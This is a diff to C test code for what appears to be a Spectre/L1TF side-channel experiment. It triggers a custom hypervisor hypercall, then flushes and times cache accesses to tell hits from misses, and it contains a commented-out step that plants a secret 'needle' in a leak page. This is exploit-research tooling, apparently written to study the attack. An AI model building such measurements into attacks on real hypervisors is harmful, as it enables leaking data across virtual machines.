@@ -10,9 +10,11 @@
 #include <time.h>
 #include <unistd.h>
 
+#include "asm.h"
 #include "constants.h"
 #include "hypercall.h"
 #include "time_deque.h"
+#include "timing.h"
 
 int hypercall(struct send_ipi_hypercall *opts) {
   const char *hypercall_path = "/proc/hypercall/send_ipi";
@@ -60,8 +62,10 @@ size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iter
 
   size_t min = -1;
   for (size_t i = 0; i < iters; ++i) {
-    size_t access_time = hypercall(&opts);
-    min = access_time < min ? access_time : min;
+    clflush(buf);
+    hypercall(&opts);
+    size_t time = access_time(buf);
+    min = time < min ? time : min;
   }
 
   return min;
@@ -167,14 +171,24 @@ void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
     err(errno, "Could not parse min");
   }
 
-  const size_t iterations = 10000;
-  for (int set_idx = 0; set_idx < 64; ++set_idx) {
+  // char needle[128];
+  // ssize_t needle_size = read(STDIN_FILENO, needle, 128);
+  // if (needle_size <= 0) {
+  //   err(errno, "No l1tf needle");
+  // }
+  // memcpy(leak_page, needle, needle_size);
+
+  const size_t iterations = 100000;
+  printf("Doing %ld iterations\n", iterations);
+  for (int set_idx = 0; set_idx < 1; ++set_idx) {
 
     size_t hit = access_buffer_with_spectre(leak_page, min, iterations, set_idx);
     size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations, set_idx);
 
-    printf("Miss: %ld\tHit: %ld\n", miss, hit);
+    printf("%d\tMiss: %ld\tHit: %ld\n", set_idx, miss, hit);
   }
+
+  // memset(leak_page, 0, needle_size);
 }
 
 int main(int argc, char *argv[argc]) {
